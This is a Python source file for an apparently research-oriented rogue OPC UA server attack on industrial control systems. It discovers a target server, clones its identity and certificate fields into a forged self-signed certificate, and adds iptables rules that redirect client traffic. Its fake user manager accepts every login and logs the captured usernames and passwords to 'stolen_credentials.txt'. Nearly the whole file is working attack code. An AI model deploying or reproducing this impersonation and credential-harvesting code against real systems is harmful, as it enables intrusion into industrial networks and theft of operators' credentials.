import time
import subprocess
import datetime
from utils.port_scanner import scan_port
from opcua.crypto import uacrypto
from random import randint
from opcua.server.user_manager import UserManager
import re
import ssl
from OpenSSL import crypto, SSL
from opcua import ua, uamethod, Server, Client, tools
import os
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


"""
Useful string dict mappings

Mappings can be expanded to support other security policies
"""
security_policy_dict = {'Basic256Sha256_Sign': ua.SecurityPolicyType.Basic256Sha256_Sign,
                        'Basic256Sha256_SignAndEncrypt': ua.SecurityPolicyType.Basic256Sha256_SignAndEncrypt
                        }

identity_tokens_dict = {'anonymous': 'Anonymous',
                        'certificate_basic256sha256': 'Basic256Sha256',
                        'username': 'Username'
                        }

def get_x509_fields_dict(cert):
    """
    Certificate generation can be improved adding more strings from here 
    https://people.eecs.berkeley.edu/~jonah/bc/org/bouncycastle/asn1/x509/X509Name.html
    if  cert.get_subject().XX none returns None
    
    Parameters
    -------
    cert:[X509 object]
        [certificate to clone]
    """
    x509_fields_dict = {'countryName': cert.get_subject().C,
                        'stateOrProvinceName': cert.get_subject().ST,
                        'localityName': cert.get_subject().L,
                        'organizationName': cert.get_subject().O,
                        'commonName': cert.get_subject().CN,
                        'emailAddress': cert.get_subject().emailAddress,
                        'serialNumber': cert.get_serial_number(),
                        'subjectAltName': get_certificate_subjectaltname(cert)
                        }
    return x509_fields_dict


def get_certificate_subjectaltname(x509cert):
    # https://stackoverflow.com/questions/49491732/pyopenssl-how-can-i-get-sansubject-alternative-names-list
    san = ''
    ext_count = x509cert.get_extension_count()
    for i in range(0, ext_count):
        ext = x509cert.get_extension(i)
        if 'subjectAltName' in str(ext.get_short_name()):
            san = ext.__str__()
    #san = san.split(",");
    return san


def generate_certificate(dict, validityStartInSeconds=0, validityEndInSeconds=10*365*24*60*60,
                         KEY_FILE=os.path.join(os.path.dirname(
                             __file__), 'generated_cert_key.pem'),
                         CERT_FILE=os.path.join(os.path.dirname(__file__), 'generated_cert.pem')):
    """
    generate the private and public key of the Rogue Server
    clonign all the information retrieved by the target server certificate.

    Parameters
    ----------
    dict : [dictionary]
        [dictionary obtained from calling get_certificate_subjectaltname()]
    validityStartInSeconds : int, optional
        [date of cert validity in seconds], by default 0
    validityEndInSeconds : [type], optional
        [date of cert expiration in seconds], by default 10*365*24*60*60
    KEY_FILE : [type], optional
        [location where the rogue server key will be stored], by default os.path.join(os.path.dirname( __file__), 'generated_cert_key.pem')
    CERT_FILE : [type], optional
        [location where the rogue server certificate will be stored], by default os.path.join(os.path.dirname(__file__), 'generated_cert.pem')
    """
    # create a key pair
    k = crypto.PKey()
    k.generate_key(crypto.TYPE_RSA, 2048)
    # create a self-signed cert
    cert = crypto.X509()
    cert.set_version(2)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(validityEndInSeconds)
    cert.set_pubkey(k)
    cert.get_subject().C = dict['countryName']
    cert.get_subject().ST = dict['stateOrProvinceName']
    cert.get_subject().L = dict['localityName']
    cert.get_subject().O = dict['organizationName']
    #cert.get_subject().OU = dict['organizationUnitName']
    cert.get_subject().CN = dict['commonName']
    cert.get_subject().emailAddress = dict['emailAddress']
    cert.set_serial_number(dict['serialNumber'])
    cert.add_extensions([
                        crypto.X509Extension(
                            b'basicConstraints', False, b'CA:FALSE'),
                        crypto.X509Extension(
                            b'keyUsage', False, b'nonRepudiation, digitalSignature, keyEncipherment, dataEncipherment, keyCertSign'),
                        crypto.X509Extension(
                            b'subjectKeyIdentifier', False, b'hash', subject=cert),
                        crypto.X509Extension(
                            b'subjectAltName', False, dict['subjectAltName'].replace(" Address", "").encode()),
                        crypto.X509Extension(
                            b'extendedKeyUsage', False, b'serverAuth, clientAuth')
                        ])
    cert.add_extensions([
                        crypto.X509Extension(
                            b'authorityKeyIdentifier', False, b'keyid,issuer', issuer=cert)
                        ])
    cert.set_issuer(cert.get_subject())
    cert.sign(k, 'sha256')
    with open(CERT_FILE, "wt") as f:
        f.write(crypto.dump_certificate(
            crypto.FILETYPE_PEM, cert).decode("utf-8"))
    with open(KEY_FILE, "wt") as f:
        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))


def enable_port_forwarding(address, source, dest):
    """
    shell call to enable port forwarding (requires superuser priviledges)

    Parameters
    ----------
    address : [string]
        [server address]
    source : [string]
        [source port]
    dest : [string]
        [destination port]
    """
    opts = {'iptables': '/usr/sbin/iptables', 'protocol': 'tcp',
            'source_port': str(source), 'dest_port': str(dest), 'ipAddress': str(address)}
    ipcmd_1 = '{iptables} -t nat -A PREROUTING -s {ipAddress} -p {protocol} --dport {source_port} -j REDIRECT --to  {dest_port}'.format(
        **opts)
    ipcmd_2 = '{iptables} -t nat -A OUTPUT -s {ipAddress} -p {protocol} --dport {source_port} -j REDIRECT --to  {dest_port}'.format(
        **opts)
    ipcmd_3 = '{iptables} -t nat -A PREROUTING -s {ipAddress} -p {protocol} --dport {dest_port} -j REDIRECT --to  {source_port}'.format(
        **opts)
    ipcmd_4 = '{iptables} -t nat -A OUTPUT -s {ipAddress} -p {protocol} --dport {dest_port} -j REDIRECT --to  {source_port}'.format(
        **opts)
    subprocess.call(ipcmd_1, shell=True)
    subprocess.call(ipcmd_2, shell=True)
    subprocess.call(ipcmd_3, shell=True)
    subprocess.call(ipcmd_4, shell=True)
    
def connect_and_get_server_endpoints(client):
    """
    re-implement the method from python opcua/client/client.py to make it consistet with the OPC UA standard i.e. without OpenSecureChannel
    Parameters
    """
    client.connect_socket()
    try:
        client.send_hello()
        endpoints = client.get_endpoints()
    finally:
        client.disconnect_socket()
    return endpoints
    
def connect_and_find_servers(client):
    """re-implement the method from python opcua/client/client.py to make it consistet with the OPC UA standard i.e. without OpenSecureChannel)"""
    client.connect_socket()
    try:
        client.send_hello()
        servers = client.find_servers()
    finally:
        client.disconnect_socket()
    return servers


def copy_server_info_and_clone_certificate(address, port):
    """
    Copy target server info and clone the certificate

    Parameters
    ----------
    address : [string]
        [target server address]
    port : [string]
        [target server port]

    Returns
    -------
    [dictionary]
        [dictionary containint server info]
    """
    client = Client("opc.tcp://"+address+':'+port)
    print("Performing discovery at {0}\n".format(
        "opc.tcp://"+address+':'+port))
    server_info = {}
    server = connect_and_find_servers(client)[0]
    server_info['server_name'] = server.ApplicationName.to_string()
    server_info['server_uri'] = server.ApplicationUri
    endpoints = connect_and_get_server_endpoints(client)
    server_info['endpoints'] = []
    i = 0
    for endpoint in endpoints:
        #string_endpoints  = tools.endpoint_to_strings(endpoint)
        # extract security mode for the given enpoint: None, Sign, SignAndEncrypt
        security_mode = re.findall(r'\.(\w+)', str(endpoint.SecurityMode))[0]
        # extract security policy for the given enpoint: e.g. None, Basic256Sha256
        security_policy = re.findall(r'#(\w+)', endpoint.SecurityPolicyUri)[0]
        found_info = {}
        found_info['SecurityMode'] = security_mode
        found_info['SecurityPolicy'] = security_policy

        server_info['endpoints'].append(security_policy_dict[found_info['SecurityPolicy'] +
                                                             '_'+found_info['SecurityMode']])
        if i == 0:
            #Store target server certificate to file
            bcert = endpoint.ServerCertificate
            cert = ssl.DER_cert_to_PEM_cert(bcert)
            path = os.path.join(os.path.dirname(__file__),
                                'retrived_server_cert.pem')
            f = open(path, 'w')
            f.write(cert)
            f.close()

        server_info['identitytokens'] = []
        for tok in endpoint.UserIdentityTokens:
            server_info['identitytokens'].append(
                identity_tokens_dict[tok.PolicyId])
        i = i+1
    #load target server certificate and clone it (the certificate is stored in the file system)
    cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert)
    generate_certificate(get_x509_fields_dict(cert))
    return server_info


def user_manager(isession, username, password):
    """
    Fake user manager, it receives user credentials, 
    decrypts them, prints them in the command line interface and stores them in the file system.
    Returns
    -------
    [bool]
        [returns True, the victim client believes to be authenticated]
    """
    isession.user = UserManager.User
    print('Incoming Connection with Authentication')
    print('Stolen Credentials:')
    print('Username: ' + username)
    print('Password: ' + password)
    stolen_credentials = {}
    stolen_credentials['username'] = username
    stolen_credentials['password'] = password
    with open('stolen_credentials.txt', 'w') as f:
        f.write(str(stolen_credentials))
        f.close
    return True

def start_rogue_server(server_info):
    """
    OPC-UA-Server Setup
    """
    server = Server()

    endpoint = "opc.tcp://127.0.0.1:4841"
    server.set_endpoint(endpoint)

    server_name = server_info['server_name']
    server.set_server_name(server_name)
    address_space = server.register_namespace("namespace")

    uri = server_info['server_uri']
    server.set_application_uri(uri)

    cert = os.path.join(os.path.dirname(__file__), 'generated_cert.pem')
    key = os.path.join(os.path.dirname(__file__), 'generated_cert_key.pem')
    server.load_certificate(cert)
    server.load_private_key(key)

    server.set_security_policy(server_info['endpoints'])
    server.set_security_IDs(server_info['identitytokens'])

    server.user_manager.set_user_manager(user_manager)

    """
    OPC-UA-Modeling
    """
    root_node = server.get_root_node()
    object_node = server.get_objects_node()
    server_node = server.get_server_node()

    try:
        server.import_xml("custom_nodes.xml")
    except FileNotFoundError:
        pass
    except Exception as e:
        print(e)

    servicelevel_node = server.get_node("ns=0;i=2267")  # Service-Level Node
    servicelevel_value = 255  # 0-255 [Byte]
    servicelevel_dv = ua.DataValue(ua.Variant(
        servicelevel_value, ua.VariantType.Byte))
    servicelevel_node.set_value(servicelevel_dv)

    parameter_obj = server.nodes.objects.add_object(address_space, "Parameter")
    token_node = parameter_obj.add_variable(
        address_space, "token", ua.Variant(0, ua.VariantType.UInt32))
    # token_node.set_writable() #if clients should be able to write
    Temp = parameter_obj.add_variable(address_space, "Temperature", 0)
    Press = parameter_obj.add_variable(address_space, "Pressure", 0)
    Time = parameter_obj.add_variable(address_space, "Time", 0)

    """
    OPC-UA-Server Start
    """
    server.start()
    try:
        while 1:
            Temp.set_value(randint(0, 100))
            Press.set_value(randint(20, 35))
            Time.set_value(datetime.datetime.now())
            time.sleep(2)
    except KeyboardInterrupt:
        server.stop()